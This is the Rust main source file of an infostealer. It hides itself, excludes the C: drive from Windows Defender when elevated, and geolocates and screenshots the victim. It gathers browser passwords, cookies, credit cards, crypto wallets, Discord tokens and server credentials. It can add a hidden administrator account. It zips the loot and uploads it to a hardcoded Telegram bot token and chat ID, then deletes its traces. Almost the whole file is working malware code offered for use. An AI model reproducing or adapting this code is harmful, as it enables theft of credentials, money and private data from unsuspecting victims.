//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![windows_subsystem = "windows"] // it is "console" by default

mod anti_emulation;
mod chromium;
mod clipper;
mod firefox;
mod messengers;
mod misc;
mod persistence;
mod wallets;
mod anti_analysis;

extern crate serde;

use std::os::windows::process::CommandExt;
use std::process::Command;

use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use screenshots::*;
use std::collections::HashMap;
use std::io::Write;
use std::{fs::File, iter::Iterator};
use wmi::Variant;
use wmi::{COMLibrary, WMIConnection};
use zip_extensions::*;
use once_cell::sync::Lazy;
use std::env;
use std::fs;

#[allow(dead_code)]
enum DeliveryMethod {
    TELEGRAM,
    NONE,
}

const MODE: DeliveryMethod = DeliveryMethod::TELEGRAM;

// Telegram Channel ID
pub static CHANNEL_ID: Lazy<String> = Lazy::new(|| obfstr::obfstr!("1345739411").to_string());

// Telegram API
pub static API_KEY: Lazy<String> = Lazy::new(|| obfstr::obfstr!("1488976181:AAEfXDn9V-H1WNuSuijAJl8kxEOdpLxJ5Fs").to_string());

//Behaviours
const MELT: bool = false;
const MUTEX: bool = false;

//Defensive
const ANTI_VM: bool = false;
const ANTI_ANAL: bool = false;

//Autostart
const AUTOSTART: bool = false;
const AUTOSTART_NAME: &str = "";

//Extra
const RAT: bool = false;
const GRAB_USERAGENT: bool = false;
const CLIPPER: bool = false;

static mut PASSWORDS: usize = 0;
static mut WALLETS: usize = 0;
static mut COOKIES: usize = 0;
static mut FILES: usize = 0;
static mut CREDIT_CARDS: usize = 0;
static mut SERVERS: usize = 0;
static mut DISCORD: usize = 0;
static mut OTHERS: usize = 0;

static mut additional_infos: Vec<String> = Vec::new();

#[tokio::main]
async fn main() {
    let path = format!(
        "{}\\{}\\",
        std::env::temp_dir().display(),
        thread_rng()
            .sample_iter(&Alphanumeric)
            .take(30)
            .map(char::from)
            .collect::<String>()
    );
    println!("{}", path);
    std::fs::create_dir_all(&path).unwrap();

    let com_lib = COMLibrary::new().unwrap();

    let mutex_path = format!(
        "{}\\{}",
        std::env::var("APPDATA").unwrap(),
        obfstr::obfstr!("winscp.md")
    );


    if MUTEX {
        let path = std::path::Path::new(&mutex_path);
        if path.exists() {
            if CLIPPER {
                clipper::clipper();
            }

            std::process::exit(0);
        } else {
            let mut file = File::create(mutex_path).unwrap();
        }
   }

    if ANTI_VM {
        anti_emulation::detect(com_lib);
    }

    if ANTI_ANAL {  
        anti_analysis::analysis_tools_process();
    }

    unsafe {
        if persistence::is_elevated() {
            // run powershell hidden Set-MpPreference -ExclusionPath

            let mut command = Command::new(obfstr::obfstr!("powershell.exe"));
            command
                .arg(obfstr::obfstr!("-WindowStyle"))
                .arg(obfstr::obfstr!("Hidden"))
                .arg(obfstr::obfstr!("-Command"))
                .arg(obfstr::obfstr!("Set-MpPreference -ExclusionPath"))
                .arg(obfstr::obfstr!("C:\\"))
                .creation_flags(0x08000000)
                .spawn()
                .expect(obfstr::obfstr!("Failed to execute command"));
        }
    }

    let mut file = File::create(format!("{}\\{}", path, obfstr::obfstr!("user_info.txt"))).unwrap();

    let geo_info: serde_json::Value = reqwest::get(obfstr::obfstr!("http://ipwho.is/?output=json"))
        .await
        .unwrap()
        .json()
        .await
        .unwrap();

    let mut buffer_pc_info = Vec::new();

    let username = std::env::var("USERNAME").unwrap();

    buffer_pc_info.push(obfstr::obfstr!("\r\n- IP Info -\r\n").to_string());

    buffer_pc_info.push(format!(
        "{}: {}",
        obfstr::obfstr!("IP"),
        geo_info["ip"].as_str().unwrap()
    ));
    buffer_pc_info.push(format!(
        "{}: {}",
        obfstr::obfstr!("Country"),
        geo_info["country"].as_str().unwrap()
    ));
    buffer_pc_info.push(format!(
        "{}: {}",
        obfstr::obfstr!("City"),
        geo_info["city"].as_str().unwrap()
    ));
    buffer_pc_info.push(format!(
        "{}: {}",
        obfstr::obfstr!("Postal"),
        geo_info["postal"].as_str().unwrap()
    ));
    buffer_pc_info.push(format!(
        "{}: {} - A{}",
        obfstr::obfstr!("ISP"),
        geo_info["connection"]["isp"].as_str().unwrap(),
        geo_info["connection"]["asn"].as_i64().unwrap()
    ));
    buffer_pc_info.push(format!(
        "{}: {}",
        obfstr::obfstr!("Timezone"),
        geo_info["timezone"]["utc"].as_str().unwrap()
    ));

    buffer_pc_info.push(obfstr::obfstr!("\r\n- PC Info -\r\n").to_string());

    // get os via wmic

    buffer_pc_info.append(&mut query_hardware(com_lib));

    buffer_pc_info.push(obfstr::obfstr!("\r\n- Log Info -\r\n").to_string());

    buffer_pc_info.push(obfstr::obfstr!("\r\nBuild:_____\r\n").to_string());

    chromium::grab(path.clone());
    firefox::grab(path.clone()).await;
    wallets::grab(path.clone());
    misc::grab(path.clone());
    messengers::grab(path.clone());

    unsafe {
        buffer_pc_info.push(match PASSWORDS > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Passwords"), PASSWORDS),
            false => format!("{}: ❌\n", obfstr::obfstr!("Passwords")),
        });
        buffer_pc_info.push(match COOKIES > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Cookies"), COOKIES),
            false => format!("{}: ❌\n", obfstr::obfstr!("Cookies")),
        });
        buffer_pc_info.push(match WALLETS > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Wallets"), WALLETS),
            false => format!("{}: ❌\n", obfstr::obfstr!("Wallets")),
        });

        buffer_pc_info.extend(additional_infos.clone());


        buffer_pc_info.push(match FILES > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Files"), FILES),
            false => format!("{}: ❌\n", obfstr::obfstr!("Files")),
        });
        buffer_pc_info.push(match CREDIT_CARDS > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Credit Cards"), CREDIT_CARDS),
            false => format!("{}: ❌\n", obfstr::obfstr!("Credit Cards")),
        });
        buffer_pc_info.push(match SERVERS > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Servers FTP/SSH"), SERVERS),
            false => format!("{}: ❌\n", obfstr::obfstr!("Servers FTP/SSH")),
        });
        buffer_pc_info.push(match DISCORD > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Discord Tokens"), DISCORD),
            false => format!("{}: ❌\n", obfstr::obfstr!("Discord Tokens")),
        });
        buffer_pc_info.push(match OTHERS > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Others"), OTHERS),
            false => format!("{}: ❌\n", obfstr::obfstr!("Others")),
        });
    }

    // get user agent
    if GRAB_USERAGENT {
        let mut useragent = String::from("Unknown");

        std::thread::spawn(move || {
            // start hidden cmd with command start http://127.0.0.1:6949
            let mut cmd = Command::new(obfstr::obfstr!("cmd.exe"));
            cmd.arg(obfstr::obfstr!("/c"))
                .arg(obfstr::obfstr!("start"))
                .arg(obfstr::obfstr!("http://127.0.0.1:6949"));
            cmd.creation_flags(0x08000000);
            let _ = cmd.spawn().unwrap();
        });

        let result =
            tokio::time::timeout(std::time::Duration::from_secs(60), start_server_and_wait()).await;

        if result.is_ok() {
            useragent = result.unwrap();
        }

        buffer_pc_info.push(format!(
            "{}: {}\n",
            obfstr::obfstr!("User Agent"),
            useragent
        ));
    }

    file.write_all(buffer_pc_info.join("\r\n").as_bytes())
        .unwrap();

    // screenshot

    let mut i = 1;
    for screen in Screen::all() {
        let image = screen.capture().unwrap();
        let buffer = image.buffer();
        std::fs::write(
            format!(
                "{string_path}\\{sr}{i}.png",
                string_path = path.clone(),
                i = i,
                sr = obfstr::obfstr!("screen")
            ),
            &buffer,
        )
        .unwrap(); // make it with i because the library is stupid and cant do it on its own.
        i += 1;
    }

    if MELT {
        let _ = houdini::disappear();
    }


    
    let wmi_con = WMIConnection::new(com_lib);

    if wmi_con.is_ok() {

    let wmi_con = wmi_con.unwrap();

    if RAT {

    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!("SELECT ProductType FROM Win32_OperatingSystem"))
        .unwrap();

     drop(wmi_con);
     
    for result in results {
        for value in result.values() {
            if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
                

                // add user with net

                let mut cmd = Command::new(obfstr::obfstr!("cmd.exe"));
                cmd.creation_flags(0x08000000);
                cmd.arg("net");
                cmd.arg("user");
                cmd.arg(obfstr::obfstr!("/add"));
                cmd.arg(obfstr::obfstr!("lol"));
                cmd.arg(obfstr::obfstr!("lol1337!!tt"));

                let _ = cmd.spawn().unwrap();

                // give local admin

                let mut cmd = Command::new(obfstr::obfstr!("cmd.exe"));
                cmd.creation_flags(0x08000000);
                cmd.arg(obfstr::obfstr!("/c"));
                cmd.arg(obfstr::obfstr!("net"));
                cmd.arg(obfstr::obfstr!("localgroup"));
                cmd.arg(obfstr::obfstr!("Administrators"));
                cmd.arg(obfstr::obfstr!("/add"));
                cmd.arg(obfstr::obfstr!("lol"));

                let _ = cmd.spawn().unwrap();
                unsafe { additional_infos.push("Tried adding user lol with password lol1337!!tt\n".to_string()); }
            }
        }
    }
   }
}

    if AUTOSTART {
        persistence::enable_persistance(AUTOSTART_NAME);
    }

    std::fs::File::create(format!(
        "{path}\\out.zip",
        path = std::env::temp_dir().to_string_lossy()
    ))
    .unwrap();
    zip_create_from_directory(
        &std::path::Path::new(&format!(
            "{path}\\out.zip",
            path = std::env::temp_dir().to_string_lossy()
        ))
        .to_path_buf(),
        &std::path::Path::new(&path).to_path_buf(),
    )
    .unwrap();

    

    unsafe {


        println!("{}: {}", obfstr::obfstr!("Cookies"), COOKIES);
        println!("{}: {}", obfstr::obfstr!("Passwords"), PASSWORDS);


            if matches!(MODE, DeliveryMethod::TELEGRAM) {
                let url = format!("{}{}{}{}&caption={}&parse_mode=HTML", obfstr::obfstr!("https://api.telegram.org/bot"), *API_KEY, obfstr::obfstr!("/sendDocument?chat_id="), *CHANNEL_ID, buffer_pc_info.join("\r\n").replace("\r\n", "%0A"));

                let client = reqwest::Client::new();

                println!("{}", url);

                let file = std::fs::read(&format!(
                    "{path}\\out.zip",
                    path = std::env::temp_dir().to_string_lossy()
                ))
                .unwrap();
                let file_part = reqwest::multipart::Part::bytes(file)
                    .file_name(format!(
                        "[{}]_{}.zip",
                        geo_info["country_code"].as_str().unwrap(),
                        geo_info["ip"].as_str().unwrap()
                    ))
                    .mime_str("application/zip")
                    .unwrap();
                let form = reqwest::multipart::Form::new().part("document", file_part);

                let post = client
                    .post(&url)
                    .multipart(form)
                    .send()
                    .await
                    .unwrap()
                    .text()
                    .await
                    .unwrap();
                println!("{}", post);
            }

            if CLIPPER {
                println!("Starting Clipper");
                
        unsafe {
            if persistence::is_elevated() {

            let nl_dll = winapi::um::libloaderapi::LoadLibraryA("ntdll.dll\0".as_ptr() as *const i8);

            let RtlAdjustPrivilege = winapi::um::libloaderapi::GetProcAddress(
                nl_dll,
                "RtlAdjustPrivilege\0".as_ptr() as *const i8,
            );

            let NtSetInformationProcess = winapi::um::libloaderapi::GetProcAddress(
                nl_dll,
                "NtSetInformationProcess\0".as_ptr() as *const i8,
            );
            let transmuted_rtladjustpriv: unsafe extern "system" fn(
                usize,
                bool,
                bool,
                *mut bool,
            ) -> i32 = std::mem::transmute(RtlAdjustPrivilege);

            let transmuted_ntsetinfo: unsafe extern "system" fn(
                winapi::um::winnt::HANDLE,
                u32,
                *mut u32,
                u32,
            ) -> i32 = std::mem::transmute(NtSetInformationProcess);

            let mut old = false;

            transmuted_rtladjustpriv(19, true, true, &mut old);

            transmuted_ntsetinfo(
                winapi::um::processthreadsapi::GetCurrentProcess(),
                0x1D,
                &mut 1,
                4,
            );
        }
    }
                clipper::clipper();
            }


        }

 let temp_dir = env::temp_dir();
 let out_path = temp_dir.join(obfstr::obfstr!("out.zip"));
 let sensfiles_path = temp_dir.join(obfstr::obfstr!("sensfiles.zip"));
            
 let _ = fs::remove_file(sensfiles_path);
 let _ = fs::remove_file(out_path);
    
}

fn query_hardware(com: COMLibrary) -> Vec<String> {
    let wmi = WMIConnection::new(com).unwrap();

    let results: Vec<HashMap<String, Variant>> = wmi
        .raw_query(obfstr::obfstr!("SELECT Caption FROM Win32_OperatingSystem"))
        .unwrap();

    let mut os_name = String::from("Unknown");

    if let Some(os) = results.first() {
        if let Some(Variant::String(caption)) = os.get(obfstr::obfstr!("Caption")) {
            os_name = caption.to_string();
        }
    }

    let mut cpu_name = String::from("Unknown");

    let cpu_results: Vec<HashMap<String, Variant>> = wmi
        .raw_query(obfstr::obfstr!("SELECT Name FROM Win32_Processor"))
        .unwrap();

    if let Some(cpu) = cpu_results.first() {
        if let Some(Variant::String(name)) = cpu.get("Name") {
            cpu_name = name.to_string();
        }
    }

    let mut gpu_name = String::from("");

    let gpu_results: Vec<HashMap<String, Variant>> = wmi.raw_query(obfstr::obfstr!("SELECT Name,CurrentHorizontalResolution, CurrentVerticalResolution FROM Win32_VideoController")).unwrap();

    for gpu in gpu_results {
        if let Some(Variant::String(name)) = gpu.get("Name") {
            gpu_name.push_str(&format!("\r\n    - {}", name))
        }

        if let Some(Variant::UI4(res_x)) = gpu.get("CurrentHorizontalResolution") {
            if let Some(Variant::UI4(res_y)) = gpu.get("CurrentVerticalResolution") {
                gpu_name.push_str(&format!(" ({}, {})", res_x, res_y));
            }
        }
    }

    if gpu_name.is_empty() {
        gpu_name = String::from("Unknown");
    }

    if ANTI_VM {
        if gpu_name.eq("Unknown") {
            std::process::exit(0);
        }

        if gpu_name.contains(obfstr::obfstr!("Virtual"))
            || gpu_name.contains(obfstr::obfstr!("VMware"))
            || gpu_name.contains(obfstr::obfstr!("VirtualBox"))
            || gpu_name.contains(obfstr::obfstr!("QEMU"))
        {
            std::process::exit(0);
        }
    }

    // get hwid

    let mut hwid = String::from("Unknown");

    let hwid_results: Vec<HashMap<String, Variant>> = wmi
        .raw_query("SELECT SerialNumber FROM Win32_BaseBoard")
        .unwrap();

    if let Some(board) = hwid_results.first() {
        if let Some(Variant::String(serial)) = board.get("SerialNumber") {
            hwid = serial.to_string();
        }
    }

    // Current Language

    let mut language = String::from("Unknown");

    let mut binding = std::process::Command::new("powershell.exe");
    binding.creation_flags(0x08000000);
    
    binding
        .arg("-NoProfile")
        .arg("-NonInteractive")
        .arg("-NoLogo")
        .arg("-Command")
        .arg("[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Get-Culture | Select -ExpandProperty DisplayName");
    
    let output = binding.output().unwrap();
    
    if output.status.success() {
        let out = String::from_utf8_lossy(&output.stdout);
        language = out.trim().to_string();
    }  

    let mut out = Vec::new();

    out.push(format!("{}: {}", obfstr::obfstr!("OS"), os_name));
    out.push(format!("{}: {}", obfstr::obfstr!("CPU"), cpu_name));
    out.push(format!("{}: {}", obfstr::obfstr!("GPU"), gpu_name));
    out.push(format!("{}: {}", obfstr::obfstr!("HWID"), hwid));
    out.push(format!(
        "{}: {}",
        obfstr::obfstr!("Current Language"),
        language
    ));
    out.push(format!(
        "{}: {}",
        obfstr::obfstr!("FileLocation"),
        std::env::current_exe()
            .unwrap()
            .display()
            .to_string()
            .replace(r"\\?\", "") /* Replace UNIC Path */
    ));
    unsafe {
        out.push(format!(
            "{}: {}",
            obfstr::obfstr!("Is Elevated"),
            persistence::is_elevated()
        ));
    }

    out.push(obfstr::obfstr!("\r\n- Other Info -\r\n").to_string());

    // query antivirus

    let wmi = WMIConnection::with_namespace_path("root\\SecurityCenter2", com);

    if wmi.is_err() {
        out.push(format!("{}: {}", obfstr::obfstr!("Antivirus"), "Unknown"));
        return out;
    }

    let wmi = wmi.unwrap();

    let mut antivirus = String::from("");

    let antivirus_results: Vec<HashMap<String, Variant>> = wmi
        .raw_query("SELECT displayName FROM AntiVirusProduct")
        .unwrap();

    for antivirus_product in antivirus_results {
        if let Some(Variant::String(display_name)) = antivirus_product.get("displayName") {
            antivirus.push_str(&format!("\r\n    - {}", display_name))
        }
    }

    if antivirus.is_empty() {
        antivirus = String::from("Unknown");
    }

    out.push(format!("{}: {}", obfstr::obfstr!("Antivirus"), antivirus));

    out
}

async fn start_server_and_wait() -> String {
    let data = tokio::spawn(async {
        use tokio::io::AsyncReadExt;
        let listener = tokio::net::TcpListener::bind("127.0.0.1:6949").await;

        let mut stream = match listener {
            Ok(listener) => {
                listener.accept().await.unwrap().0
            }
            Err(e) => {
                return String::from("");
            }
        };

        // read the data from the client

        let mut data = [0u8; 500]; // using 50 byte buffer

        stream.read(&mut data).await.unwrap();

        let data = String::from_utf8_lossy(&data).to_string();

        for line in data.split("\r\n") {
            println!("{}", line);
            if line.starts_with("User-Agent:") {
                println!("User-Agent: {}", line.replace("User-Agent: ", ""));
                return line.replace("User-Agent: ", "");
            }
        }
        "Not Found".to_string()
    })
    .await
    .unwrap();

    // start a tcp server on port 6949

    return data;
}
